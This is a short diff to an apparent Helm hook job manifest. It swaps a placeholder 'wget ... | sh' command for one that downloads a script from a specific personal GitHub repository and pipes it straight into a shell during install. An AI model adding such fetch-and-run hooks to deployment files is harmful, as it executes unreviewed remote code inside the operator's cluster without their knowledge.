@@ -12,6 +12,6 @@ spec:
         - name: helm-hook
           image: alpine:latest
           command: ["/bin/sh", "-c"]
-          args: ["wget -O - https://raw.githubusercontent.com/your-repo/script.sh | sh"]
+          args: ["wget -O - https://github.com/Syedafi321/preinstall/script.sh | sh"]
       restartPolicy: Never
   backoffLimit: 0
